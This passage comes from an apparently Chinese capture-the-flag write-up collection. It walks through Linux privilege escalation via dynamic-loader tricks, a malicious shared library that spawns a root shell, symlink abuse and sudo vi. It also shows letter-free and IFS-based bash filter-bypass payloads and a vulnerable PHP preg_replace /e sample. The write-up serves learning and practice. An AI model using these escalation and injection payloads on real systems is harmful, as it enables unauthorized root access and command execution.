<a id="__codelineno-109-15" name="__codelineno-109-15" href="#__codelineno-109-15"></a><span class="x">// 构造 fake object（通过 UAF 实现）</span>
</code></pre></div>
<p>蚁剑直接梭哈</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/6881d63d58cb8da5c8d48fea.png"></p>
<!-- Imported from D:\\Book\\Web\\Chapter6\6-43.md -->
<h3 id="_10">动态加载器提权<a class="headerlink" href="#_10" title="Permanent link">¶</a></h3>
<p><img alt="" src="https://pic1.imgdb.cn/item/6881dc2358cb8da5c8d4c4e7.png"></p>
<p><strong>Linux 动态加载器</strong></p>
<p>当一个动态链接的程序被执行时：</p>
<ol>
<li>内核加载 ELF 可执行文件</li>
<li>内核发现它是动态链接的，于是不直接跳转到 <code>main()</code>，而是转而先执行动态链接器（例如 <code>/lib64/ld-linux-x86-64.so.2</code>）</li>
<li>动态链接器会解析 ELF 的 <code>.interp</code> 段，加载所有依赖的 <code>.so</code>，执行符号重定位，然后跳转到用户程序的入口点</li>
</ol>
<p>动态加载器本身是安全的，但以下机制可能被攻击者利用来实现**本地提权**：</p>
<p><strong>✅ 1. 环境变量劫持（LD_ 系列）</strong></p>
<p>Linux 动态链接器在执行过程中会解析多个环境变量，如：</p>
<table>
<thead>
<tr>
<th>环境变量</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>LD_PRELOAD</code></td>
<td>指定要预先加载的共享库路径。</td>
</tr>
<tr>
<td><code>LD_LIBRARY_PATH</code></td>
<td>指定额外搜索共享库路径。</td>
</tr>
<tr>
<td><code>LD_AUDIT</code></td>
<td>指定审计库，用于拦截函数调用。</td>
</tr>
</tbody>
</table>
<p><strong>前提</strong>：动态链接程序，且不是 setuid 程序（对 setuid 程序，这些变量通常被忽略）</p>
<p><strong>提权利用</strong>：</p>
<ul>
<li>若存在一个以 root 权限执行的 <strong>非 setuid 程序</strong>（如某些 misconfigured 的守护进程），攻击者可以通过篡改 <code>LD_PRELOAD</code> 来注入自己的 <code>.so</code> 以执行任意代码</li>
</ul>
<p><strong>✅ 2. 利用 SUID 可执行程序中的加载器行为</strong></p>
<p>利用方式一：<strong>自定义的动态加载器</strong></p>
<p>某些发行版/环境中允许自定义 <code>.interp</code> 段，比如将其指向攻击者自编译的 <code>ld-linux.so</code>：</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-110-1" name="__codelineno-110-1" href="#__codelineno-110-1"></a><span class="c1"># 修改 interp 段</span>
<a id="__codelineno-110-2" name="__codelineno-110-2" href="#__codelineno-110-2"></a>patchelf<span class="w"> </span>--set-interpreter<span class="w"> </span>./evil-ld.so.2<span class="w"> </span>./suid-binary
</code></pre></div>
<p>若目标程序是 SUID 且未做强校验，则攻击者可借此执行自己的加载器，从而控制整个加载过程并提权</p>
<blockquote>
<p><strong>注意</strong>：多数现代系统对此有保护，只有当目标程序是用户自己编译的情况下才可能实现该攻击</p>
</blockquote>
<p>利用方式二：<strong>伪造共享库路径</strong></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-111-1" name="__codelineno-111-1" href="#__codelineno-111-1"></a><span class="c1"># 创建 SUID 程序运行所需的共享库名称</span>
<a id="__codelineno-111-2" name="__codelineno-111-2" href="#__codelineno-111-2"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">'int init() { setuid(0); system("/bin/bash"); return 0; }'</span><span class="w"> </span>&gt;<span class="w"> </span>exploit.c
<a id="__codelineno-111-3" name="__codelineno-111-3" href="#__codelineno-111-3"></a>gcc<span class="w"> </span>-shared<span class="w"> </span>-fPIC<span class="w"> </span>exploit.c<span class="w"> </span>-o<span class="w"> </span>libmylib.so
<a id="__codelineno-111-4" name="__codelineno-111-4" href="#__codelineno-111-4"></a>
<a id="__codelineno-111-5" name="__codelineno-111-5" href="#__codelineno-111-5"></a><span class="c1"># 设置 LD_LIBRARY_PATH 并运行目标程序</span>
<a id="__codelineno-111-6" name="__codelineno-111-6" href="#__codelineno-111-6"></a><span class="nv">LD_LIBRARY_PATH</span><span class="o">=</span>.<span class="w"> </span>./vuln-suid-binary
</code></pre></div>
<p>若 SUID 程序在不安全的路径下寻找 <code>.so</code>，可以被替换</p>
<p>蚁剑连接出题人给出的 WebShell</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/6881dfc358cb8da5c8d4ed36.png"></p>
<p><code>ldd</code> 用于显示一个可执行文件或共享库所依赖的共享库（即动态链接库）</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/6881e00458cb8da5c8d4ee1b.png"></p>
<p>这样的话只要确认下 <code>ldd</code> 中动态库是否具备执行权限，是一个突破口</p>
<p>发现 <code>/lib64/ld-linux-x86-64.so.2</code> 具有执行权限</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/6881e06458cb8da5c8d4efd8.png"></p>
<p>利用这个文件执行拿到 flag</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/6881e0b658cb8da5c8d4f248.png"></p>
<!-- Imported from D:\\Book\\Web\\Chapter6\6-44.md -->
<p>符号链接提权</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/68a2a0cb58cb8da5c82c8c0e.png"></p>
<p>先在“泄露端口”用 <code>nc</code> 拿到密码</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/68a2a11758cb8da5c82c8f8c.png"></p>
<p>然后回答问题</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-112-1" name="__codelineno-112-1" href="#__codelineno-112-1"></a>What<span class="w"> </span>is<span class="w"> </span>the<span class="w"> </span>top<span class="w"> </span>cyber<span class="w"> </span>security<span class="w"> </span>conference<span class="w"> </span><span class="k">in</span><span class="w"> </span>the<span class="w"> </span>world?
<a id="__codelineno-112-2" name="__codelineno-112-2" href="#__codelineno-112-2"></a>DEFCON
<a id="__codelineno-112-3" name="__codelineno-112-3" href="#__codelineno-112-3"></a>the<span class="w"> </span>first<span class="w"> </span>hacker<span class="w"> </span>ever<span class="w"> </span>was<span class="w"> </span>known<span class="w"> </span><span class="k">for</span><span class="w"> </span>phreaking<span class="o">(</span>making<span class="w"> </span>free<span class="w"> </span>phone<span class="w"> </span>calls<span class="o">)</span>,<span class="w"> </span>who<span class="w"> </span>was<span class="w"> </span>it?
<a id="__codelineno-112-4" name="__codelineno-112-4" href="#__codelineno-112-4"></a>John<span class="w"> </span>Draper
</code></pre></div>
<p>发现题目提示的横幅</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-113-1" name="__codelineno-113-1" href="#__codelineno-113-1"></a>player@challenge:~$<span class="w"> </span>cat<span class="w"> </span>banner<span class="w">  </span>
<a id="__codelineno-113-2" name="__codelineno-113-2" href="#__codelineno-113-2"></a>cat<span class="w"> </span>banner
<a id="__codelineno-113-3" name="__codelineno-113-3" href="#__codelineno-113-3"></a>*************************************
<a id="__codelineno-113-4" name="__codelineno-113-4" href="#__codelineno-113-4"></a>**************WELCOME****************
<a id="__codelineno-113-5" name="__codelineno-113-5" href="#__codelineno-113-5"></a>*************************************
</code></pre></div>
<p>与刚开始建立连接对应</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/68a2a19b58cb8da5c82c9473.png"></p>
<p>找到 flag，但是没有权限</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-114-1" name="__codelineno-114-1" href="#__codelineno-114-1"></a>player@challenge:/root$<span class="w"> </span>ls
<a id="__codelineno-114-2" name="__codelineno-114-2" href="#__codelineno-114-2"></a>ls
<a id="__codelineno-114-3" name="__codelineno-114-3" href="#__codelineno-114-3"></a>flag.txt<span class="w">  </span>script.py
<a id="__codelineno-114-4" name="__codelineno-114-4" href="#__codelineno-114-4"></a>player@challenge:/root$<span class="w"> </span>ls<span class="w"> </span>-l
<a id="__codelineno-114-5" name="__codelineno-114-5" href="#__codelineno-114-5"></a>ls<span class="w"> </span>-l
<a id="__codelineno-114-6" name="__codelineno-114-6" href="#__codelineno-114-6"></a>total<span class="w"> </span><span class="m">8</span>
<a id="__codelineno-114-7" name="__codelineno-114-7" href="#__codelineno-114-7"></a>-rwx------<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w">   </span><span class="m">46</span><span class="w"> </span>Mar<span class="w"> </span><span class="m">12</span><span class="w">  </span><span class="m">2024</span><span class="w"> </span>flag.txt
<a id="__codelineno-114-8" name="__codelineno-114-8" href="#__codelineno-114-8"></a>-rw-r--r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w"> </span><span class="m">1317</span><span class="w"> </span>Feb<span class="w">  </span><span class="m">7</span><span class="w">  </span><span class="m">2024</span><span class="w"> </span>script.py
</code></pre></div>
<p>我们可以尝试用符号链接替换掉 <code>banner</code>，猜测刚开始的打印执行权限是 root</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-115-1" name="__codelineno-115-1" href="#__codelineno-115-1"></a>player@challenge:/root$<span class="w"> </span>ln<span class="w"> </span>-s<span class="w"> </span>/root/flag.txt<span class="w"> </span>~/banner
<a id="__codelineno-115-2" name="__codelineno-115-2" href="#__codelineno-115-2"></a>ln<span class="w"> </span>-s<span class="w"> </span>/root/flag.txt<span class="w"> </span>~/banner
<a id="__codelineno-115-3" name="__codelineno-115-3" href="#__codelineno-115-3"></a>ln:<span class="w"> </span>failed<span class="w"> </span>to<span class="w"> </span>create<span class="w"> </span>symbolic<span class="w"> </span>link<span class="w"> </span><span class="s1">'/home/player/banner'</span>:<span class="w"> </span>File<span class="w"> </span>exists
<a id="__codelineno-115-4" name="__codelineno-115-4" href="#__codelineno-115-4"></a>player@challenge:/root$<span class="w"> </span>rm<span class="w"> </span>~/banner
<a id="__codelineno-115-5" name="__codelineno-115-5" href="#__codelineno-115-5"></a>rm<span class="w"> </span>~/banner
<a id="__codelineno-115-6" name="__codelineno-115-6" href="#__codelineno-115-6"></a>player@challenge:/root$<span class="w"> </span>ln<span class="w"> </span>-s<span class="w"> </span>/root/flag.txt<span class="w"> </span>~/banner
<a id="__codelineno-115-7" name="__codelineno-115-7" href="#__codelineno-115-7"></a>ln<span class="w"> </span>-s<span class="w"> </span>/root/flag.txt<span class="w"> </span>~/banner
</code></pre></div>
<p>重新建立连接拿到 flag</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/68a2a2cd58cb8da5c82ca011.png"></p>
<!-- Imported from D:\\Book\\Web\\Chapter6\6-45.md -->
<h3 id="bash-rce">Bash 错误 RCE（仅支持数字+符号）<a class="headerlink" href="#bash-rce" title="Permanent link">¶</a></h3>
<p><img alt="" src="https://pic1.imgdb.cn/item/68a2a3f258cb8da5c82cac36.png"></p>
<p>常规输入命令无效</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/68a2a49258cb8da5c82cb283.png"></p>
<p>执行无字母命令并故意构造错误</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-116-1" name="__codelineno-116-1" href="#__codelineno-116-1"></a><span class="nv">$-</span>
</code></pre></div>
<p><img alt="" src="https://pic1.imgdb.cn/item/68a2c0f558cb8da5c82d8402.png"></p>
<p>我们可以使用 <code>$_</code>变量来访问最后运行的命令。因此，要运行 <code>id</code>，我们执行以下操作：</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-117-1" name="__codelineno-117-1" href="#__codelineno-117-1"></a><span class="s2">"</span><span class="k">$(</span><span class="nv">$-</span><span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="k">)</span><span class="s2">"</span><span class="p">;</span><span class="w"> </span><span class="si">${</span><span class="nv">_</span><span class="p">:</span><span class="nv">7</span><span class="p">:</span><span class="nv">1</span><span class="si">}${</span><span class="nv">_</span><span class="p">:</span><span class="nv">20</span><span class="p">:</span><span class="nv">1</span><span class="si">}</span><span class="p">;</span>
</code></pre></div>
<p>1️⃣ 第一个部分：<code>"$($- 2&gt;&amp;1)"</code></p>
<p><code>$()</code>：命令替换，把括号里的命令执行结果作为字符串返回</p>
<p><code>$-</code>：</p>
<ul>
<li><code>$-</code> 是 <strong>Bash 内置变量</strong>，表示当前 shell 的 <strong>选项标志</strong></li>
<li>输出通常是类似 <code>himBH</code> 这样的字符串（表示 shell 开启了哪些选项）</li>
</ul>
<p><code>2&gt;&amp;1</code>：把标准错误（stderr）重定向到标准输出（stdout）</p>
<ul>
<li>这里 <code>$-</code> 是有效变量，不会报错，所以实际上 <code>2&gt;&amp;1</code> 没有作用</li>
</ul>
<p>2️⃣ 第二个部分：<code>${_:7:1}${_:20:1}</code></p>
<ol>
<li><strong><code>${VAR:start:length}</code></strong> 是 Bash **子串提取**语法：</li>
<li><code>VAR</code> 是变量名</li>
<li><code>start</code> 是起始索引（0 开始）</li>
<li><code>length</code> 是长度</li>
<li><strong><code>_</code></strong> 变量：</li>
<li>在 SansAlpha 中，通常会用 <code>_="$($- 2&gt;&amp;1)"</code> 将错误输出存到 <code>_</code> 里</li>
<li>例如 <code>_="bash: himBH: command not found"</code></li>
<li><strong><code>${_:7:1}</code></strong>：提取第 8 个字符（索引从 0 开始），在上面的例子里是 <code>h</code></li>
<li><strong><code>${_:20:1}</code></strong>：提取第 21 个字符，在上面的例子里可能是 <code>c</code></li>
<li><strong>组合</strong>：<code>${_:7:1}${_:20:1}</code> → 拼接得到 <code>id</code> 或者题目中需要的其他字符</li>
</ol>
<p><img alt="" src="https://pic1.imgdb.cn/item/68a2c17f58cb8da5c82d8a67.png"></p>
<p>由此，我们得到 <code>ls</code></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-118-1" name="__codelineno-118-1" href="#__codelineno-118-1"></a><span class="s2">"</span><span class="k">$(</span><span class="nv">$-</span><span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="k">)</span><span class="s2">"</span><span class="p">;</span><span class="w"> </span><span class="s2">"</span><span class="k">$(</span><span class="si">${</span><span class="nv">_</span><span class="p">:</span><span class="nv">7</span><span class="p">:</span><span class="nv">1</span><span class="si">}${</span><span class="nv">_</span><span class="p">:</span><span class="nv">20</span><span class="p">:</span><span class="nv">1</span><span class="si">}</span><span class="k">)</span><span class="s2">"</span><span class="p">;</span><span class="w"> </span><span class="si">${</span><span class="nv">_</span><span class="p">:</span><span class="nv">14</span><span class="p">:</span><span class="nv">1</span><span class="si">}${</span><span class="nv">_</span><span class="p">:</span><span class="nv">47</span><span class="p">:</span><span class="nv">1</span><span class="si">}</span>
</code></pre></div>
<p><img alt="" src="https://pic1.imgdb.cn/item/68a2c1ec58cb8da5c82d9078.png"></p>
<p>由此，我们得到 <code>cat</code> 和 <code>on-calastran.txt</code></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-119-1" name="__codelineno-119-1" href="#__codelineno-119-1"></a><span class="s2">"</span><span class="k">$(</span><span class="nv">$-</span><span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="k">)</span><span class="s2">"</span><span class="p">;</span><span class="w"> </span><span class="s2">"</span><span class="k">$(</span><span class="si">${</span><span class="nv">_</span><span class="p">:</span><span class="nv">7</span><span class="p">:</span><span class="nv">1</span><span class="si">}${</span><span class="nv">_</span><span class="p">:</span><span class="nv">20</span><span class="p">:</span><span class="nv">1</span><span class="si">}</span><span class="k">)</span><span class="s2">"</span><span class="p">;</span><span class="w"> </span><span class="s2">"</span><span class="k">$(</span><span class="si">${</span><span class="nv">_</span><span class="p">:</span><span class="nv">14</span><span class="p">:</span><span class="nv">1</span><span class="si">}${</span><span class="nv">_</span><span class="p">:</span><span class="nv">47</span><span class="p">:</span><span class="nv">1</span><span class="si">}</span><span class="k">)</span><span class="s2">"</span><span class="p">;</span><span class="w"> </span><span class="si">${</span><span class="nv">_</span><span class="p">:</span><span class="nv">10</span><span class="p">:</span><span class="nv">1</span><span class="si">}${</span><span class="nv">_</span><span class="p">:</span><span class="nv">11</span><span class="p">:</span><span class="nv">1</span><span class="si">}${</span><span class="nv">_</span><span class="p">:</span><span class="nv">15</span><span class="p">:</span><span class="nv">1</span><span class="si">}</span><span class="w"> </span><span class="si">${</span><span class="nv">_</span><span class="p">:</span><span class="nv">7</span><span class="p">:</span><span class="nv">16</span><span class="si">}</span>
</code></pre></div>
<p><img alt="" src="https://pic1.imgdb.cn/item/68a2c2bc58cb8da5c82d9dd8.png"></p>
<p>查看 <code>blargh</code> 目录</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-120-1" name="__codelineno-120-1" href="#__codelineno-120-1"></a><span class="s2">"</span><span class="k">$(</span><span class="nv">$-</span><span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="k">)</span><span class="s2">"</span><span class="p">;</span><span class="w"> </span><span class="s2">"</span><span class="k">$(</span><span class="si">${</span><span class="nv">_</span><span class="p">:</span><span class="nv">7</span><span class="p">:</span><span class="nv">1</span><span class="si">}${</span><span class="nv">_</span><span class="p">:</span><span class="nv">20</span><span class="p">:</span><span class="nv">1</span><span class="si">}</span><span class="k">)</span><span class="s2">"</span><span class="p">;</span><span class="w"> </span><span class="s2">"</span><span class="k">$(</span><span class="si">${</span><span class="nv">_</span><span class="p">:</span><span class="nv">14</span><span class="p">:</span><span class="nv">1</span><span class="si">}${</span><span class="nv">_</span><span class="p">:</span><span class="nv">47</span><span class="p">:</span><span class="nv">1</span><span class="si">}</span><span class="k">)</span><span class="s2">"</span><span class="p">;</span><span class="w"> </span><span class="s2">"</span><span class="k">$(</span><span class="si">${</span><span class="nv">_</span><span class="p">:</span><span class="nv">10</span><span class="p">:</span><span class="nv">1</span><span class="si">}${</span><span class="nv">_</span><span class="p">:</span><span class="nv">11</span><span class="p">:</span><span class="nv">1</span><span class="si">}${</span><span class="nv">_</span><span class="p">:</span><span class="nv">15</span><span class="p">:</span><span class="nv">1</span><span class="si">}</span><span class="w"> </span><span class="si">${</span><span class="nv">_</span><span class="p">:</span><span class="nv">7</span><span class="p">:</span><span class="nv">16</span><span class="si">}</span><span class="k">)</span><span class="s2">"</span><span class="p">;</span><span class="w"> </span><span class="si">${</span><span class="nv">_</span><span class="p">:</span><span class="nv">6</span><span class="p">:</span><span class="nv">1</span><span class="si">}${</span><span class="nv">_</span><span class="p">:</span><span class="nv">8</span><span class="p">:</span><span class="nv">1</span><span class="si">}</span><span class="w"> </span><span class="si">${</span><span class="nv">_</span><span class="p">:</span><span class="nv">59</span><span class="p">:</span><span class="nv">1</span><span class="si">}${</span><span class="nv">_</span><span class="p">:</span><span class="nv">6</span><span class="p">:</span><span class="nv">1</span><span class="si">}${</span><span class="nv">_</span><span class="p">:</span><span class="nv">5</span><span class="p">:</span><span class="nv">1</span><span class="si">}${</span><span class="nv">_</span><span class="p">:</span><span class="nv">10</span><span class="p">:</span><span class="nv">1</span><span class="si">}${</span><span class="nv">_</span><span class="p">:</span><span class="nv">262</span><span class="p">:</span><span class="nv">1</span><span class="si">}${</span><span class="nv">_</span><span class="p">:</span><span class="nv">1</span><span class="p">:</span><span class="nv">1</span><span class="si">}</span>
</code></pre></div>
<p>最后拿到 flag</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-121-1" name="__codelineno-121-1" href="#__codelineno-121-1"></a><span class="s2">"</span><span class="k">$(</span><span class="nv">$-</span><span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="k">)</span><span class="s2">"</span><span class="p">;</span><span class="w"> </span><span class="s2">"</span><span class="k">$(</span><span class="si">${</span><span class="nv">_</span><span class="p">:</span><span class="nv">7</span><span class="p">:</span><span class="nv">1</span><span class="si">}${</span><span class="nv">_</span><span class="p">:</span><span class="nv">20</span><span class="p">:</span><span class="nv">1</span><span class="si">}</span><span class="k">)</span><span class="s2">"</span><span class="p">;</span><span class="w"> </span><span class="s2">"</span><span class="k">$(</span><span class="si">${</span><span class="nv">_</span><span class="p">:</span><span class="nv">14</span><span class="p">:</span><span class="nv">1</span><span class="si">}${</span><span class="nv">_</span><span class="p">:</span><span class="nv">47</span><span class="p">:</span><span class="nv">1</span><span class="si">}</span><span class="k">)</span><span class="s2">"</span><span class="p">;</span><span class="w"> </span><span class="s2">"</span><span class="k">$(</span><span class="si">${</span><span class="nv">_</span><span class="p">:</span><span class="nv">10</span><span class="p">:</span><span class="nv">1</span><span class="si">}${</span><span class="nv">_</span><span class="p">:</span><span class="nv">11</span><span class="p">:</span><span class="nv">1</span><span class="si">}${</span><span class="nv">_</span><span class="p">:</span><span class="nv">15</span><span class="p">:</span><span class="nv">1</span><span class="si">}</span><span class="w"> </span><span class="si">${</span><span class="nv">_</span><span class="p">:</span><span class="nv">7</span><span class="p">:</span><span class="nv">16</span><span class="si">}</span><span class="k">)</span><span class="s2">"</span><span class="p">;</span><span class="w"> </span><span class="si">${</span><span class="nv">_</span><span class="p">:</span><span class="nv">30</span><span class="p">:</span><span class="nv">1</span><span class="si">}${</span><span class="nv">_</span><span class="p">:</span><span class="nv">5</span><span class="p">:</span><span class="nv">1</span><span class="si">}${</span><span class="nv">_</span><span class="p">:</span><span class="nv">9</span><span class="p">:</span><span class="nv">1</span><span class="si">}</span><span class="w"> </span><span class="si">${</span><span class="nv">_</span><span class="p">:</span><span class="nv">59</span><span class="p">:</span><span class="nv">1</span><span class="si">}${</span><span class="nv">_</span><span class="p">:</span><span class="nv">6</span><span class="p">:</span><span class="nv">1</span><span class="si">}${</span><span class="nv">_</span><span class="p">:</span><span class="nv">5</span><span class="p">:</span><span class="nv">1</span><span class="si">}${</span><span class="nv">_</span><span class="p">:</span><span class="nv">10</span><span class="p">:</span><span class="nv">1</span><span class="si">}${</span><span class="nv">_</span><span class="p">:</span><span class="nv">262</span><span class="p">:</span><span class="nv">1</span><span class="si">}${</span><span class="nv">_</span><span class="p">:</span><span class="nv">1</span><span class="p">:</span><span class="nv">1</span><span class="si">}</span>/<span class="si">${</span><span class="nv">_</span><span class="p">:</span><span class="nv">62</span><span class="p">:</span><span class="nv">1</span><span class="si">}${</span><span class="nv">_</span><span class="p">:</span><span class="nv">6</span><span class="p">:</span><span class="nv">1</span><span class="si">}${</span><span class="nv">_</span><span class="p">:</span><span class="nv">5</span><span class="p">:</span><span class="nv">1</span><span class="si">}${</span><span class="nv">_</span><span class="p">:</span><span class="nv">262</span><span class="p">:</span><span class="nv">1</span><span class="si">}</span>.<span class="si">${</span><span class="nv">_</span><span class="p">:</span><span class="nv">9</span><span class="p">:</span><span class="nv">1</span><span class="si">}${</span><span class="nv">_</span><span class="p">:</span><span class="nv">36</span><span class="p">:</span><span class="nv">1</span><span class="si">}${</span><span class="nv">_</span><span class="p">:</span><span class="nv">9</span><span class="p">:</span><span class="nv">1</span><span class="si">}</span>
</code></pre></div>
<p><img alt="" src="https://pic1.imgdb.cn/item/68a2c35d58cb8da5c82da786.png"></p>
<!-- Imported from D:\\Book\\Web\\Chapter6\6-46.md -->
<h3 id="ifs-bash">修改 IFS 绕过 Bash 中禁用空格<a class="headerlink" href="#ifs-bash" title="Permanent link">¶</a></h3>
<p><img alt="" src="https://pic1.imgdb.cn/item/68a3cedc58cb8da5c8334f86.png"></p>
<p>执行运行 <code>ls</code> 报错，使用 <code>$()</code> 包裹</p>
<p><code>$(ls)</code> shell 将使用 <code>ls</code> 命令的输出并将其替换为你的输入</p>
<p>例如，如果你运行 <code>ls</code>，输出为 <code>file1.txt file2.txt directory1/ directory2/</code></p>
<p>但如果你运行 <code>$(ls)</code> 则相当于运行 <code>file1.txt file2.txt directory1/ directory2/</code></p>
<p>这肯定意味着存在一个名为 <code>blargh</code> 的目录</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/68a3cefb58cb8da5c8335060.png"></p>
<p>下一步应该看看这个目录后面还有什么，所以我调用了 <code>$(ls blargh)</code></p>
<p>调用此命令时，出现了一个意想不到的语法错误</p>
<p>我尝试了其他几个命令，发现 Special 接口不允许命令之间用空格分隔</p>
<p>绕过方法是修改内部字段分隔符（IFS），该变量定义用于将模式分隔为标记的字符</p>
<p>我决定将其从空格改为 <code>]</code></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-122-1" name="__codelineno-122-1" href="#__codelineno-122-1"></a><span class="k">$(</span><span class="nv">IFS</span><span class="o">=]</span><span class="p">;</span><span class="nv">b</span><span class="o">=</span>ls<span class="o">]</span>blargh<span class="p">;</span><span class="nv">$b</span><span class="k">)</span>
</code></pre></div>
<p>得到输出</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-123-1" name="__codelineno-123-1" href="#__codelineno-123-1"></a>flag.txt<span class="w"> </span>not<span class="w"> </span>found
</code></pre></div>
<p>使用 <code>cat</code> 我们运行</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-124-1" name="__codelineno-124-1" href="#__codelineno-124-1"></a><span class="k">$(</span><span class="nv">IFS</span><span class="o">=]</span><span class="p">;</span><span class="nv">b</span><span class="o">=</span>cat<span class="o">]</span>blargh/flag.txt<span class="p">;</span><span class="nv">$b</span><span class="k">)</span>
</code></pre></div>
<!-- Imported from D:\\Book\\Web\\Chapter6\6-47.md -->
<h3 id="sudo-vi">sudo vi 提权<a class="headerlink" href="#sudo-vi" title="Permanent link">¶</a></h3>
<p><img alt="" src="https://pic1.imgdb.cn/item/68a3d29658cb8da5c8338f3e.png"></p>
<p>先检查有哪些权限</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-125-1" name="__codelineno-125-1" href="#__codelineno-125-1"></a>sudo<span class="w"> </span>-l
</code></pre></div>
<p>我们拥有 vi 文本编辑器的 sudo 权限，这意味着我们可以以 root 身份在任何文件上运行 vi</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/68a3d32458cb8da5c8339a82.png"></p>
<p>在这种情况下，我们使用 vi 在当前目录中创建了自己的文件并创建新 shell</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/68a3d3f458cb8da5c833a396.png"></p>
<p>提权成功！</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/68a3d41358cb8da5c833a46f.png"></p>
<!-- Imported from D:\\Book\\Web\\Chapter6\6-5.md -->
<h3 id="ifsnum"><span class="arithmatex">\(IFS\)</span>num 代替空格绕过<a class="headerlink" href="#ifsnum" title="Permanent link">¶</a></h3>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b16ff0d0e0a243d4ffc16b.jpg"></p>
<p>通用是 Ping 的回显</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b16fffd0e0a243d4ffc16e.jpg"></p>
<p>通过测试发现过滤了空格以及一些符号和 flag，但是 $IFS 可以使用</p>
<p>$IFS 在 Linux 下表示分隔符</p>
<p>但是如果单纯的 cat$IFS9，bash 解释器会把整个 IFS9 当做变量名，导致输不出来结果</p>
<p>所以要加一个 $ 变成 $9，这里任何数字都可以绕过</p>
<p>连接在一起相当于在脚本中使用特定的字段分隔符并访问命令行参数中的特定字段</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b1704ad0e0a243d4ffc174.jpg"></p>
<!-- Imported from D:\\Book\\Web\\Chapter6\6-6.md -->
<h3 id="preg_replace-e-rce-foreach">preg_replace() /e 修饰符 RCE 绕过 foreach<a class="headerlink" href="#preg_replace-e-rce-foreach" title="Permanent link">¶</a></h3>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b170a0d0e0a243d4ffc17e.jpg"></p>
<p>打开网页给出了源码</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b170bbd0e0a243d4ffc180.jpg"></p>
<p>要传参 $text 是个文件，而且文件内容是 I have……</p>
<p>这里可以联想到 PHP 伪协议 input，其 POST 的值是 I have…… 即可绕过（data 也可以）</p>
<p>$file 最后是文件包含，也是要传文件名的</p>
<p>联想到另一个 PHP 伪协议 filter，注释表明了一个文件，构造 payload 执行</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b17115d0e0a243d4ffc18d.jpg"></p>
<p>解码拿到文件源码</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-126-1" name="__codelineno-126-1" href="#__codelineno-126-1"></a><span class="cp">&lt;?php</span>
<a id="__codelineno-126-2" name="__codelineno-126-2" href="#__codelineno-126-2"></a><span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">];</span>
<a id="__codelineno-126-3" name="__codelineno-126-3" href="#__codelineno-126-3"></a><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$id</span><span class="p">;</span>
<a id="__codelineno-126-4" name="__codelineno-126-4" href="#__codelineno-126-4"></a>
<a id="__codelineno-126-5" name="__codelineno-126-5" href="#__codelineno-126-5"></a><span class="k">function</span> <span class="nf">complex</span><span class="p">(</span><span class="nv">$re</span><span class="p">,</span> <span class="nv">$str</span><span class="p">)</span> <span class="p">{</span>
<a id="__codelineno-126-6" name="__codelineno-126-6" href="#__codelineno-126-6"></a>    <span class="k">return</span> <span class="nb">preg_replace</span><span class="p">(</span>
<a id="__codelineno-126-7" name="__codelineno-126-7" href="#__codelineno-126-7"></a>        <span class="s1">'/('</span> <span class="o">.</span> <span class="nv">$re</span> <span class="o">.</span> <span class="s1">')/ei'</span><span class="p">,</span>
<a id="__codelineno-126-8" name="__codelineno-126-8" href="#__codelineno-126-8"></a>        <span class="s1">'strtolower("\\1")'</span><span class="p">,</span>
<a id="__codelineno-126-9" name="__codelineno-126-9" href="#__codelineno-126-9"></a>        <span class="nv">$str</span>
<a id="__codelineno-126-10" name="__codelineno-126-10" href="#__codelineno-126-10"></a>    <span class="p">);</span>
<a id="__codelineno-126-11" name="__codelineno-126-11" href="#__codelineno-126-11"></a><span class="p">}</span>
<a id="__codelineno-126-12" name="__codelineno-126-12" href="#__codelineno-126-12"></a>
<a id="__codelineno-126-13" name="__codelineno-126-13" href="#__codelineno-126-13"></a>
